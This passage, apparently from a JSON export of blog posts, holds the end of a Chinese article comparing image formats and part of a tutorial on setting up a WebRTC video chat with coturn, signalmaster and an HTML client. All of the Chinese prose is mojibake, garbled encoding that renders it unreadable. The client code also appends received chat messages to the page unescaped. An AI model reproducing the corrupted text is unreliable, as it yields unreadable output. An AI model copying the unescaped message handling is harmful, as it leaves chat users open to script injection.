æŸå‹ç¼©è¿‡çš„å›¾ç‰‡ä¸­æ¢å¤å‡ºåŸæ¥çš„ä¿¡æ¯ã€‚\n\n<!-- more -->\n\n#### 1.2 ç´¢å¼•è‰²vsç›´æ¥è‰²\n\nè®¡ç®—æœºåœ¨è¡¨ç¤ºé¢œè‰²çš„æ—¶å€™ï¼Œæœ‰ä¸¤ç§å½¢å¼ï¼Œä¸€ç§ç§°ä½œç´¢å¼•é¢œè‰²([Index Color](https://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/Indexed_color))ï¼Œä¸€ç§ç§°ä½œç›´æ¥é¢œè‰²([Direct Color](https://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/Color_depth%23Direct_color))ã€‚\n\n- ç´¢å¼•è‰²ã€‚ç”¨ä¸€ä¸ªæ•°å­—æ¥ä»£è¡¨ï¼ˆç´¢å¼•ï¼‰ä¸€ç§é¢œè‰²ï¼Œåœ¨å­˜å‚¨å›¾ç‰‡çš„æ—¶å€™ï¼Œå­˜å‚¨ä¸€ä¸ªæ•°å­—çš„ç»„åˆï¼ŒåŒæ—¶å­˜å‚¨æ•°å­—åˆ°å›¾ç‰‡é¢œè‰²çš„æ˜ å°„ã€‚è¿™ç§æ–¹å¼åªèƒ½å­˜å‚¨æœ‰é™ç§é¢œè‰²ï¼Œé€šå¸¸æ˜¯256ç§é¢œè‰²ï¼Œå¯¹åº”åˆ°è®¡ç®—æœºç³»ç»Ÿä¸­ï¼Œä½¿ç”¨ä¸€ä¸ªå­—èŠ‚çš„æ•°å­—æ¥ç´¢å¼•ä¸€ç§é¢œè‰²ã€‚\n- ç›´æ¥è‰²ã€‚ä½¿ç”¨å››ä¸ªæ•°å­—æ¥ä»£è¡¨ä¸€ç§é¢œè‰²ï¼Œè¿™å››ä¸ªæ•°å­—åˆ†åˆ«ä»£è¡¨è¿™ä¸ªé¢œè‰²ä¸­çº¢è‰²ã€ç»¿è‰²ã€è“è‰²ä»¥åŠé€æ˜åº¦ã€‚ç°åœ¨æµè¡Œçš„æ˜¾ç¤ºè®¾å¤‡å¯ä»¥åœ¨è¿™å››ä¸ªç»´åº¦åˆ†åˆ«æ”¯æŒ256ç§å˜åŒ–ï¼Œæ‰€ä»¥ç›´æ¥è‰²å¯ä»¥è¡¨ç¤º2çš„32æ¬¡æ–¹ç§é¢œè‰²ã€‚å½“ç„¶å¹¶éæ‰€æœ‰çš„ç›´æ¥è‰²éƒ½æ”¯æŒè¿™ä¹ˆå¤šç§ï¼Œä¸ºå‹ç¼©ç©ºé—´ä½¿ç”¨ï¼Œæœ‰å¯èƒ½åªæœ‰è¡¨è¾¾çº¢ã€ç»¿ã€è“çš„ä¸‰ä¸ªæ•°å­—ï¼Œæ¯ä¸ªæ•°å­—ä¹Ÿå¯èƒ½ä¸æ”¯æŒ256ç§å˜åŒ–ä¹‹å¤šã€‚\n\n#### 1.3 ç‚¹é˜µå›¾vsçŸ¢é‡å›¾\n\n- ç‚¹é˜µå›¾ï¼Œä¹Ÿå«åšä½å›¾ï¼Œåƒç´ å›¾ã€‚\n\n  æ„æˆç‚¹é˜µå›¾çš„æœ€å°å•ä½æ˜¯è±¡ç´ ï¼Œä½å›¾å°±æ˜¯ç”±è±¡ç´ é˜µåˆ—çš„æ’åˆ—æ¥å®ç°å…¶æ˜¾ç¤ºæ•ˆæœçš„ï¼Œæ¯ä¸ªè±¡ç´ æœ‰è‡ªå·±çš„é¢œè‰²ä¿¡æ¯ï¼Œåœ¨å¯¹ä½å›¾å›¾åƒè¿›è¡Œç¼–è¾‘æ“ä½œçš„æ—¶å€™ï¼Œå¯æ“ä½œçš„å¯¹è±¡æ˜¯æ¯ä¸ªè±¡ç´ ï¼Œæˆ‘ä»¬å¯ä»¥æ”¹å˜å›¾åƒçš„è‰²ç›¸ã€é¥±å’Œåº¦ã€æ˜åº¦ï¼Œä»è€Œæ”¹å˜å›¾åƒçš„æ˜¾ç¤ºæ•ˆæœã€‚ç‚¹é˜µå›¾ç¼©æ”¾ä¼šå¤±çœŸï¼Œç”¨æœ€è¿‘éå¸¸æµè¡Œçš„æ²™ç”»æ¥æ¯”å–»æœ€æ°å½“ä¸è¿‡ï¼Œå½“ä½ ä»è¿œå¤„çœ‹çš„æ—¶å€™ï¼Œç”»é¢ç»†è…»å¤šå½©ï¼Œä½†æ˜¯å½“ä½ é çš„éå¸¸è¿‘çš„æ—¶å€™ï¼Œä½ å°±èƒ½çœ‹åˆ°ç»„æˆç”»é¢çš„æ¯ç²’æ²™å­ä»¥åŠæ¯ä¸ªæ²™ç²’çš„é¢œè‰²ã€‚\n\n- çŸ¢é‡å›¾ï¼Œä¹Ÿå«åšå‘é‡å›¾ã€‚\n\n  çŸ¢é‡å›¾å¹¶ä¸çºªå½•ç”»é¢ä¸Šæ¯ä¸€ç‚¹çš„ä¿¡æ¯ï¼Œè€Œæ˜¯çºªå½•äº†å…ƒç´ å½¢çŠ¶åŠé¢œè‰²çš„ç®—æ³•ï¼Œå½“ä½ æ‰“å¼€ä¸€ä»˜çŸ¢é‡å›¾çš„æ—¶å€™ï¼Œè½¯ä»¶å¯¹å›¾å½¢è±¡å¯¹åº”çš„å‡½æ•°è¿›è¡Œè¿ç®—ï¼Œå°†è¿ç®—ç»“æœ[å›¾å½¢çš„å½¢çŠ¶å’Œé¢œè‰²]æ˜¾ç¤ºç»™ä½ çœ‹ã€‚æ— è®ºæ˜¾ç¤ºç”»é¢æ˜¯å¤§è¿˜æ˜¯å°ï¼Œç”»é¢ä¸Šçš„å¯¹è±¡å¯¹åº”çš„ç®—æ³•æ˜¯ä¸å˜çš„ï¼Œæ‰€ä»¥ï¼Œå³ä½¿å¯¹ç”»é¢è¿›è¡Œå€æ•°ç›¸å½“å¤§çš„ç¼©æ”¾ï¼Œå…¶æ˜¾ç¤ºæ•ˆæœä»ç„¶ç›¸åŒ(ä¸å¤±çœŸ)ã€‚\n\n\n\n# 2. BMP(å¤è€)\n\n**BMP**å–è‡ªä½å›¾**B**it**m**a**p**çš„ç¼©å†™ï¼Œæ˜¯æ— æŸçš„ã€æ—¢æ”¯æŒç´¢å¼•è‰²ä¹Ÿæ”¯æŒç›´æ¥è‰²çš„ã€ç‚¹é˜µå›¾ã€‚\n\n### 2.1 ç‰¹ç‚¹\n\nBMPæ–‡ä»¶é€šå¸¸æ˜¯ä¸[å‹ç¼©](https://zh.wikipedia.org/wiki/å›¾åƒå‹ç¼©)çš„ï¼Œæ‰€ä»¥å®ƒä»¬é€šå¸¸æ¯”åŒä¸€å¹…å›¾åƒçš„å‹ç¼©å›¾åƒæ–‡ä»¶æ ¼å¼è¦å¤§å¾ˆå¤šã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ª800Ã—600çš„24ä½å‡ ä¹å æ®1.4[MB](https://zh.wikipedia.org/wiki/MB)ç©ºé—´ã€‚å› æ­¤å®ƒä»¬é€šå¸¸ä¸é€‚åˆåœ¨[å› ç‰¹ç½‘](https://zh.wikipedia.org/wiki/å› ç‰¹ç½‘)æˆ–è€…å…¶ä»–ä½é€Ÿæˆ–è€…æœ‰å®¹é‡é™åˆ¶çš„[ä»‹è´¨](https://zh.wikipedia.org/wiki/åª’ä»‹)ä¸Šè¿›è¡Œä¼ è¾“ã€‚\n\nç°åœ¨é™¤äº†åœ¨Windowsæ“ä½œç³»ç»Ÿä¸­è¿˜æ¯”è¾ƒå¸¸è§ä¹‹å¤–ï¼Œæˆ‘ä»¬å‡ ä¹çœ‹ä¸åˆ°å®ƒã€‚åœ¨åŒæ ·çš„å›¾ç‰‡è´¨é‡ä¸‹ï¼ŒBMPæ ¼å¼çš„å›¾ç‰‡æ–‡ä»¶å¤§å°æ˜¯GIFæ ¼å¼çš„å¾ˆå¤šå€ã€‚\n\n\n\n# 3. GIFï¼ˆ1987å¹´)\n\nå›¾åƒäº’æ¢æ ¼å¼ï¼ˆè‹±è¯­ï¼šGraphics Interchange Formatï¼Œç®€ç§°GIFï¼‰ï¼Œæ˜¯æ— æŸçš„ã€é‡‡ç”¨ç´¢å¼•è‰²çš„ã€ç‚¹é˜µå›¾ã€‚\n\n### 3.1 ç‰¹ç‚¹\n\nGIFæ ¼å¼è‡ª1987å¹´ç”±CompuServeå…¬å¸å¼•å…¥åï¼Œå› å…¶ä½“ç§¯å°è€Œæˆåƒç›¸å¯¹æ¸…æ™°ï¼Œç‰¹åˆ«é€‚åˆäºåˆæœŸæ…¢é€Ÿçš„äº’è”ç½‘ã€‚\n\nGIFæ˜¯æ— æŸçš„ï¼Œé‡‡ç”¨GIFæ ¼å¼ä¿å­˜å›¾ç‰‡ä¸ä¼šé™ä½å›¾ç‰‡è´¨é‡ã€‚åŒæ—¶ï¼ŒGIFæ ¼å¼è¿˜å…·æœ‰æ”¯æŒåŠ¨ç”»ä»¥åŠé€æ˜çš„ä¼˜ç‚¹ã€‚ä½†ï¼ŒGIFæ ¼å¼ä»…æ”¯æŒ8bitçš„ç´¢å¼•è‰²ï¼Œå³åœ¨æ•´ä¸ªå›¾ç‰‡ä¸­ï¼Œåªèƒ½å­˜åœ¨256ç§ä¸åŒçš„é¢œè‰²ã€‚\n\nGIFæ ¼å¼é€‚ç”¨äºå¯¹è‰²å½©è¦æ±‚ä¸é«˜åŒæ—¶éœ€è¦æ–‡ä»¶ä½“ç§¯è¾ƒå°çš„åœºæ™¯ï¼Œæ¯”å¦‚ä¼ä¸šLogoã€çº¿æ¡†ç±»çš„å›¾ç­‰ã€‚å› å…¶ä½“ç§¯å°çš„ç‰¹ç‚¹ï¼Œç°åœ¨GIFè¢«å¹¿æ³›çš„åº”ç”¨åœ¨å„ç±»ç½‘ç«™ä¸­ã€‚\n\n\n\n# 4. JPGï¼ˆ1992å¹´ï¼‰\n\nè”åˆå›¾åƒä¸“å®¶å°ç»„ï¼ˆè‹±è¯­ï¼šJoint Photographic Experts Groupï¼Œç¼©å†™ï¼šJPEGï¼‰ï¼ŒJPEGæ˜¯æœ‰æŸçš„ã€é‡‡ç”¨ç›´æ¥è‰²çš„ã€ç‚¹é˜µå›¾ã€‚\n\n### 4.1 ç‰¹ç‚¹\n\nJPEGæ˜¯ä¸€ç§é’ˆå¯¹ç…§ç‰‡å½±åƒè€Œå¹¿æ³›ä½¿ç”¨çš„æœ‰æŸå‹ç¼©æ ‡å‡†æ–¹æ³•ã€‚æ­¤å›¢é˜Ÿåˆ›ç«‹äº1986å¹´ï¼Œ1992å¹´å‘å¸ƒäº†JPEGçš„æ ‡å‡†è€Œåœ¨1994å¹´è·å¾—äº†ISO 10918-1çš„è®¤å®šã€‚\n\nä½¿ç”¨JPEGæ ¼å¼å‹ç¼©çš„å›¾ç‰‡æ–‡ä»¶ä¸€èˆ¬ä¹Ÿè¢«ç§°ä¸ºJPEG Filesï¼Œæœ€æ™®éè¢«ä½¿ç”¨çš„æ‰©å±•åæ ¼å¼ä¸º.jpgï¼Œå…¶ä»–å¸¸ç”¨çš„æ‰©å±•åè¿˜åŒ…æ‹¬.JPEGã€.jpeã€.jfifä»¥åŠ.jifã€‚\n\nJPEGçš„å›¾ç‰‡çš„ä¼˜ç‚¹ï¼Œæ˜¯é‡‡ç”¨äº†ç›´æ¥è‰²ï¼Œå¾—ç›Šäºæ›´ä¸°å¯Œçš„è‰²å½©ï¼Œjpgå¯ä½¿ç”¨çš„é¢œè‰²æœ‰1600wä¹‹å¤šï¼ˆ2^24ï¼‰ï¼Œè€Œäººçœ¼è¯†åˆ«çš„é¢œè‰²æ•°é‡å¤§çº¦åªæœ‰1wå¤šç§ï¼Œå› æ­¤jpgéå¸¸é€‚åˆè‰²å½©ä¸°å¯Œå›¾ç‰‡ã€æ¸å˜è‰²ã€‚jpgæœ‰æŸå‹ç¼©ç§»é™¤è‚‰çœ¼æ— æ³•è¯†åˆ«çš„å›¾ç‰‡ç»†èŠ‚åï¼Œå¯ä»¥å°†å›¾ç‰‡çš„å°ºå¯¸å¤§å¹…åº¦åœ°å‡å°ã€‚\n\nä¸GIFç›¸æ¯”ï¼ŒJPEGä¸é€‚åˆç”¨æ¥å­˜å‚¨ä¼ä¸šLogoã€çº¿æ¡†ç±»çš„å›¾ã€‚å› ä¸ºæœ‰æŸå‹ç¼©ä¼šå¯¼è‡´å›¾ç‰‡æ¨¡ç³Šï¼Œè€Œç›´æ¥è‰²çš„é€‰ç”¨ï¼Œåˆä¼šå¯¼è‡´å›¾ç‰‡æ–‡ä»¶è¾ƒGIFæ›´å¤§ã€‚\n\n### 4.2 jpg vs jpeg\n\nä¸¤è€…ä¹‹é—´é™¤äº†å­—ç¬¦æ•°æ²¡æœ‰åŒºåˆ«ã€‚\n\nå…¨åã€æ­£å¼æ‰©å±•åæ˜¯JPEGã€‚ä½†å› DOSã€Windows 95ç­‰æ—©æœŸç³»ç»Ÿé‡‡ç”¨çš„8.3å‘½åè§„åˆ™åªæ”¯æŒæœ€é•¿3å­—ç¬¦çš„æ‰©å±•åï¼Œä¸ºäº†å…¼å®¹é‡‡ç”¨äº†.jpgã€‚ä¹Ÿå› å†å²ä¹ æƒ¯å’Œå…¼å®¹æ€§è€ƒè™‘ï¼Œ.jpgç›®å‰æ›´æµè¡Œã€‚\n\n\n\n# 5. PNGï¼ˆ1997å¹´ï¼‰\n\nä¾¿æºå¼ç½‘ç»œå›¾å½¢ï¼ˆè‹±è¯­ï¼šPortable Network Graphicsï¼ŒPNGï¼‰\n\n### 5.1 ç‰¹ç‚¹\n\nPNGäº1997å¹´3æœˆä½œä¸ºçŸ¥è¯†æ€§RFC 2083å‘å¸ƒï¼Œäº2004å¹´ä½œä¸ºISO/IECæ ‡å‡†å‘å¸ƒã€‚\n\nPNGæ˜¯ä¸€ç§æ”¯æŒæ— æŸå‹ç¼©çš„ä½å›¾å›¾å½¢æ ¼å¼ï¼Œæ”¯æŒç´¢å¼•ã€ç°åº¦ã€RGBä¸‰ç§é¢œè‰²æ–¹æ¡ˆä»¥åŠAlphaé€šé“ç­‰ç‰¹æ€§ã€‚PNGçš„å¼€å‘ç›®æ ‡æ˜¯æ”¹å–„å¹¶å–ä»£GIFä½œä¸ºé€‚åˆç½‘ç»œä¼ è¾“çš„æ ¼å¼è€Œä¸éœ€ä¸“åˆ©è®¸å¯ï¼Œæ‰€ä»¥è¢«å¹¿æ³›åº”ç”¨äºäº’è”ç½‘åŠå…¶ä»–æ–¹é¢ä¸Šã€‚\n\n### 5.2 PNG-8\n\nPNG-8æ˜¯PNGçš„ç´¢å¼•è‰²ç‰ˆæœ¬ã€‚PNG-8æ˜¯æ— æŸçš„ã€ä½¿ç”¨ç´¢å¼•è‰²çš„ã€ç‚¹é˜µå›¾ã€‚\n\nPNGæ˜¯ä¸€ç§æ¯”è¾ƒæ–°çš„å›¾ç‰‡æ ¼å¼ï¼ŒPNG-8æ˜¯éå¸¸å¥½çš„GIFæ ¼å¼æ›¿ä»£è€…ï¼Œåœ¨å¯èƒ½çš„æƒ…å†µä¸‹ï¼Œåº”è¯¥å°½å¯èƒ½çš„ä½¿ç”¨PNG-8è€Œä¸æ˜¯GIFï¼Œå› ä¸ºåœ¨ç›¸åŒçš„å›¾ç‰‡æ•ˆæœä¸‹ï¼ŒPNG-8å…·æœ‰æ›´å°çš„æ–‡ä»¶ä½“ç§¯ã€‚é™¤æ­¤ä¹‹å¤–ï¼ŒPNG-8è¿˜æ”¯æŒé€æ˜åº¦çš„è°ƒèŠ‚ï¼Œè€ŒGIFå¹¶ä¸æ”¯æŒã€‚\n\nç°åœ¨ï¼Œé™¤ééœ€è¦åŠ¨ç”»çš„æ”¯æŒï¼Œå¦åˆ™æˆ‘ä»¬æ²¡æœ‰ç†ç”±ä½¿ç”¨GIFè€Œä¸æ˜¯PNG-8ã€‚å½“ç„¶äº†ï¼ŒPNG-8æœ¬èº«ä¹Ÿæ˜¯æ”¯æŒåŠ¨ç”»çš„ï¼Œåªæ˜¯æµè§ˆå™¨æ”¯æŒå¾—ä¸å¥½ï¼Œä¸åƒGIFé‚£æ ·å—åˆ°å¹¿æ³›çš„æ”¯æŒã€‚\n\n### 5.3 PNG-24\n\nPNG-24æ˜¯PNGçš„ç›´æ¥è‰²ç‰ˆæœ¬ã€‚PNG-24æ˜¯æ— æŸçš„ã€ä½¿ç”¨ç›´æ¥è‰²çš„ã€ç‚¹é˜µå›¾ã€‚\n\næ— æŸçš„ã€ä½¿ç”¨ç›´æ¥è‰²çš„ç‚¹é˜µå›¾ï¼Œå¬èµ·æ¥éå¸¸åƒBMPï¼Œæ˜¯çš„ï¼Œä»æ˜¾ç¤ºæ•ˆæœä¸Šæ¥çœ‹ï¼ŒPNG-24è·ŸBMPæ²¡æœ‰ä¸åŒã€‚PNG-24çš„ä¼˜ç‚¹åœ¨äºï¼Œå®ƒå‹ç¼©äº†å›¾ç‰‡çš„æ•°æ®ï¼Œä½¿å¾—åŒæ ·æ•ˆæœçš„å›¾ç‰‡ï¼ŒPNG-24æ ¼å¼çš„æ–‡ä»¶å¤§å°è¦æ¯”BMPå°å¾—å¤šã€‚å½“ç„¶ï¼ŒPNG24çš„å›¾ç‰‡è¿˜æ˜¯è¦æ¯”JPEGã€GIFã€PNG-8å¤§å¾—å¤šã€‚\n\nè™½ç„¶PNG-24çš„ä¸€ä¸ªå¾ˆå¤§çš„ç›®æ ‡ï¼Œæ˜¯æ›¿æ¢JPEGçš„ä½¿ç”¨ã€‚ä½†ä¸€èˆ¬è€Œè¨€ï¼ŒPNG-24çš„æ–‡ä»¶å¤§å°æ˜¯JPEGçš„äº”å€ä¹‹å¤šï¼Œè€Œæ˜¾ç¤ºæ•ˆæœåˆ™é€šå¸¸åªèƒ½è·å¾—ä¸€ç‚¹ç‚¹æå‡ã€‚æ‰€ä»¥ï¼Œåªæœ‰åœ¨ä½ ä¸åœ¨ä¹å›¾ç‰‡çš„æ–‡ä»¶ä½“ç§¯ï¼Œè€Œæƒ³è¦æœ€å¥½çš„æ˜¾ç¤ºæ•ˆæœæ—¶ï¼Œæ‰åº”è¯¥ä½¿ç”¨PNG-24æ ¼å¼ã€‚\n\nå¦å¤–ï¼ŒPNG-24è·ŸPNG-8ä¸€æ ·ï¼Œæ˜¯æ”¯æŒå›¾ç‰‡é€æ˜åº¦çš„ã€‚\n\n\n\n# 6. WebP(2010å¹´)\n\nWebPæ˜¯è°·æ­Œå¼€å‘çš„ä¸€ç§æ–°å›¾ç‰‡æ ¼å¼ï¼ŒWebPæ˜¯åŒæ—¶æ”¯æŒæœ‰æŸå’Œæ— æŸå‹ç¼©çš„ã€ä½¿ç”¨ç›´æ¥è‰²çš„ã€ç‚¹é˜µå›¾ã€‚\n\n### 6.1 ç‰¹ç‚¹\n\nWebPæœ€åˆåœ¨2010å¹´å‘å¸ƒï¼Œç›®æ ‡æ˜¯å‡å°‘æ–‡ä»¶å¤§å°ï¼Œä½†è¾¾åˆ°å’Œ[JPEG](https://zh.wikipedia.org/wiki/JPEG)æ ¼å¼ç›¸åŒçš„å›¾ç‰‡è´¨é‡ï¼Œå¸Œæœ›èƒ½å¤Ÿå‡å°‘å›¾ç‰‡æ¡£åœ¨ç½‘ç»œä¸Šçš„å‘é€æ—¶é—´ã€‚\n\n+ åœ¨æ— æŸå‹ç¼©çš„æƒ…å†µä¸‹ï¼Œç›¸åŒè´¨é‡çš„WebPå›¾ç‰‡ï¼Œæ–‡ä»¶å¤§å°è¦æ¯”PNGå°26%ï¼›\n+ åœ¨æœ‰æŸå‹ç¼©çš„æƒ…å†µä¸‹ï¼Œå…·æœ‰ç›¸åŒå›¾ç‰‡ç²¾åº¦çš„WebPå›¾ç‰‡ï¼Œæ–‡ä»¶å¤§å°è¦æ¯”JPEGå°25%~34%ï¼›\n+ WebPå›¾ç‰‡æ ¼å¼æ”¯æŒå›¾ç‰‡é€æ˜åº¦ï¼Œä¸€ä¸ªæ— æŸå‹ç¼©çš„WebPå›¾ç‰‡ï¼Œå¦‚æœè¦æ”¯æŒé€æ˜åº¦åªéœ€è¦22%çš„æ ¼å¤–æ–‡ä»¶å¤§å°ã€‚\n\nç›®å‰webpçš„è¿˜æ²¡æœ‰å¾—åˆ°å…¨é¢çš„æ”¯æŒã€‚\n\n\n\n# 7. å¯¹æ¯”\n\n| æ ¼å¼ | ä¼˜ç‚¹                                       | ç¼ºç‚¹                               | é€‚ç”¨åœºæ™¯                   |\n| ---- | ------------------------------------------ | ---------------------------------- | -------------------------- |\n| gif  | æ–‡ä»¶å°ï¼Œæ”¯æŒåŠ¨ç”»ã€é€æ˜ï¼Œæ— å…¼å®¹æ€§é—®é¢˜       | åªæ”¯æŒ256ç§é¢œè‰²                    | è‰²å½©ç®€å•çš„logoã€iconã€åŠ¨å›¾ |\n| jpg  | è‰²å½©ä¸°å¯Œï¼Œæ–‡ä»¶å°                           | æœ‰æŸå‹ç¼©ï¼Œåå¤ä¿å­˜å›¾ç‰‡è´¨é‡ä¸‹é™æ˜æ˜¾ | è‰²å½©ä¸°å¯Œçš„å›¾ç‰‡/æ¸å˜å›¾åƒ    |\n| png  | æ— æŸå‹ç¼©ï¼Œæ”¯æŒé€æ˜ï¼Œç®€å•å›¾ç‰‡å°ºå¯¸å°         | ä¸æ”¯æŒåŠ¨ç”»ï¼Œè‰²å½©ä¸°å¯Œçš„å›¾ç‰‡å°ºå¯¸å¤§   | logo/icon/é€æ˜å›¾           |\n| webp | æ–‡ä»¶å°ï¼Œæ”¯æŒæœ‰æŸå’Œæ— æŸå‹ç¼©ï¼Œæ”¯æŒåŠ¨ç”»ã€é€æ˜ | æµè§ˆå™¨å…¼å®¹æ€§ä¸å¥½                   | æ”¯æŒwebpæ ¼å¼çš„appå’Œwebview |\n\n### 7.1 é€‰æ‹©\n\n1. JPGï¼šå°†å…¶ç”¨äºå¤æ‚å›¾åƒï¼Œç›¸å†Œæˆ–å›¾åº“ä»¥åŠä¸é€æ˜å›¾åƒã€‚\n2. PNGï¼šæœ€é€‚åˆç”¨äºå®šä¹‰çº¿æ¡çš„å›¾åƒï¼Œéœ€è¦é€æ˜åº¦çš„ç…§ç‰‡ä»¥åŠéœ€è¦æœ€é«˜è´¨é‡çš„ç…§ç‰‡ã€‚\n\n\n\n![å›¾ç‰‡æè¿°](%E5%B8%B8%E8%A7%81%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F/bV5bmb.png)\n\n\n\n\n\n# 8. å‚è€ƒèµ„æ–™\n\n+ https://zh.wikipedia.org/wiki/BMP\n+ https://zh.wikipedia.org/wiki/JPEG\n+ https://zh.wikipedia.org/wiki/PNG\n+ https://zh.wikipedia.org/wiki/GIF\n+ https://zh.wikipedia.org/wiki/WebP\n+ https://www.zhihu.com/question/20028452/answer/142593276","tags":["å›¾ç‰‡"],"categories":["è®¡ç®—æœºåŸºç¡€"]},{"title":"æ­å»ºwebRTCè§†é¢‘èŠå¤©","url":"%2Fp%2F697b4dfa.html","content":"\n\n\næƒ³åœ¨å…¬ç½‘ä¸Šå®ç°è§†é¢‘é€šä¿¡ï¼Œéœ€è¦ä¸‹é¢3ä¸ªæ ¸å¿ƒå…ƒç´ ï¼š\n\n1. ä¸€ä¸ªæ˜¯NATç©¿é€æœåŠ¡å™¨(ICE Server)ï¼Œå®ç°å†…ç½‘ç©¿é€ã€‚\n2. åŸºäºWebSocketçš„ä¿¡ä»¤æœåŠ¡å™¨(Signaling Server)ï¼Œç”¨äºå»ºç«‹ç‚¹å¯¹ç‚¹çš„é€šé“ã€‚\n3. Webå®¢æˆ·ç«¯ã€‚é€šè¿‡H5çš„WebRTCç‰¹æ€§è°ƒç”¨æ‘„åƒå¤´ï¼Œè¿›è¡Œç”¨æˆ·äº¤äº’ã€‚\n\n<!-- more -->\n\n# 1. æ­å»ºNATç©¿é€æœåŠ¡å™¨coturn\n\n+ æ•™ç¨‹:\n\nhttps://github.com/coturn/coturn/wiki/README\n\n\n\n+ å‡†å¤‡å·¥ä½œ: \n\n```shell\nsudo yum install gcc\nsudo yum install openssl-devel\nsudo yum install libevent\nsudo yum install libevent-devel\nsudo yum install sqlite\nsudo yum install sqlite-devel\n\nå‚è§: https://github.com/coturn/coturn/blob/master/INSTALL\n```\n\n\n\n+ å¼€å§‹å®‰è£…:\n\n```shell\ngit clone https://github.com/coturn/coturn\n./configure\nmake\nsudo make install\n```\n\n\n\n+ å¯åŠ¨:\n\n```shell\ncp examples/etc/turnserver.conf bin/turnserver.conf\nvi bin/turnserver.conf\n\nä¿®æ”¹é…ç½®turnserver.confï¼Œå¦‚ä¸‹ï¼š\n#ç›‘å¬ç«¯å£ \nlistening-port=3478 \n#å†…ç½‘IP \nlistening-ip=ä½ çš„æœåŠ¡å™¨å†…ç½‘IP\n#å¤–ç½‘IPåœ°å€ \nexternal-ip=ä½ çš„æœåŠ¡å™¨å¤–ç½‘IP\n#è®¿é—®çš„ç”¨æˆ·ã€å¯†ç  \nuser=user:password\n\n\ncd bin\nturnserver -v -r 207.246.80.69:3478 -a -o  //207.246.80.69æ˜¯æˆ‘çš„æœåŠ¡å™¨å¤–ç½‘åœ°å€\n```\n\n\n\n+ æµ‹è¯•:\n\næ‰“å¼€ [https://webrtc.github.io/samples/src/content/peerconnection/trickle-ice/ ](https://webrtc.github.io/samples/src/content/peerconnection/trickle-ice/)è¿›è¡Œæµ‹è¯•\n\n![image-20190129145807612](æ­å»ºwebRTCè§†é¢‘èŠå¤©/1.png)\n\n\n\næµ‹è¯•æ—¶å¯ä»¥çœ‹log (https://github.com/coturn/coturn/wiki/README#logs)\n\n```\ntail -f /var/tmp/turn_æ—¥æœŸ.log \n```\n\n\n\n\n\n# 2. æ­å»ºä¿¡ä»¤æœåŠ¡å™¨simplemaster\n\n ä¿¡ä»¤æœåŠ¡å™¨ä½¿ç”¨çš„æ˜¯ [**signalmaster**](https://github.com/andyet/signalmaster) ï¼ŒåŸºäºwebsocketã€‚é€‰ç”¨å®ƒçš„åŸå› æ˜¯å¯ä»¥ç›´æ¥é›†æˆturn serveræœåŠ¡å™¨ã€‚\n\n```shell\ngit clone https://github.com/andyet/signalmaster.git\ncd signalmaster\nnpm install express\nnpm install yetify\nnpm install getconfig\nnpm install node-uuid\nnpm install socket.io\n\n\næˆ–è€…\n\ngit clone https://github.com/nguyenphu160196/signalmaster.git\ncd signalmaster\nnpm install\n```\n\n\n\nsignalmasterå¯ä»¥è¿æ¥turnserverï¼Œä½†ä¸æ”¯æŒç”¨æˆ·å/å¯†ç æ–¹å¼ï¼Œéœ€è¦å¯¹æºç sockets.js 110è¡Œè¿›è¡Œè°ƒæ•´ï¼Œè°ƒæ•´åçš„ä»£ç å¦‚ä¸‹ï¼š\n\n```javascript\n    if (!config.turnorigins || config.turnorigins.indexOf(origin) !== -1) {\n            config.turnservers.forEach(function (server) {\n                credentials.push({\n                    username: server.username,\n                    credential: server.credential,\n                    urls: server.urls || server.url\n                });\n            });\n        }\n\n```\n\n\n\nå®Œæˆåï¼Œä¿®æ”¹config/production.jsonï¼Œé…ç½®turnserverçš„ç”¨æˆ·å’Œå¯†ç ï¼Œå¦‚ä¸‹ï¼š\n\n```json\n{\n  \"isDev\": true,\n  \"server\": {\n    \"port\": 8888,\n    \"/* secure */\": \"/* whether this connects via https */\",\n    \"secure\": false,\n    \"key\": null,\n    \"cert\": null,\n    \"password\": null\n  },\n  \"rooms\": {\n    \"/* maxClients */\": \"/* maximum number of clients per room. 0 = no limit */\",\n    \"maxClients\": 0\n  },\n  \"stunservers\": [\n    {\n      \"urls\": \"stun:stun.ekiga.net:3478\"\n    }\n  ],\n  \"turnservers\": [\n    {\n      \"urls\": [\"turn:www.turn.cn:3478\"],\n      \"username\": \"user\",\n      \"credential\":\"pass\",  \n      \"expiry\": 86400\n    }\n  ]\n}\n```\n\n\n\nå¯åŠ¨:\n\n```shell\nnohup node server.js &\n\n//Output:\n&yet -- signal master is running at: http://localhost:8888\n```\n\n\n\n# 3. æ­å»ºWebå®¢æˆ·ç«¯\n\nå¤åˆ¶ä¸‹é¢çš„ä»£ç ï¼Œä¿å­˜ä¸ºä¸€ä¸ªhtmlæ–‡ä»¶, æ”¾åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Š\n\n```html\n\n<!DOCTYPE html>\n<html>\n<head>\n    <script src=\"https://code.jquery.com/jquery-1.9.1.js\"></script>\n    <script src=\"http://simplewebrtc.com/latest-v3.js\"></script>\n    <script>\n \n        var webrtc = new SimpleWebRTC({\n            // the id/element dom element that will hold \"our\" video\n            localVideoEl: 'localVideo',\n            // the id/element dom element that will hold remote videos\n            remoteVideosEl: 'remoteVideos',\n            // immediately ask for camera access\n            autoRequestMedia: true,\n            url:'http://207.246.80.69:8888',\n            nick:'nickname'\n        });\n \n \n \n        // we have to wait until it's ready\n        webrtc.on('readyToCall', function () {\n            // you can name it anything\n            webrtc.joinRoom('roomid');\n \n            // Send a chat message\n            $('#send').click(function () {\n                var msg = $('#text').val();\n                webrtc.sendToAll('chat', { message: msg, nick: webrtc.config.nick });\n                $('#messages').append('<br>You:<br>' + msg + '\\n');\n                $('#text').val('');\n            });\n        });\n \n        //For Text Chat ------------------------------------------------------------------\n        // Await messages from others\n        webrtc.connection.on('message', function (data) {\n            if (data.type === 'chat') {\n                console.log('chat received', data);\n                $('#messages').append('<br>' + data.payload.nick + ':<br>' + data.payload.message+ '\\n');\n            }\n        });\n        \n    </script>\n    <style>\n        #remoteVideos video {\n            height: 150px;\n        }\n \n        #localVideo {\n            height: 150px;\n        }\n    </style>\n</head>\n<body>\n    <textarea id=\"messages\" rows=\"5\" cols=\"20\"></textarea><br />\n    <input id=\"text\" type=\"text\" />\n    <input id=\"send\" type=\"button\" value=\"send\" /><br />\n    <video id=\"localVideo\"></video>\n    <div 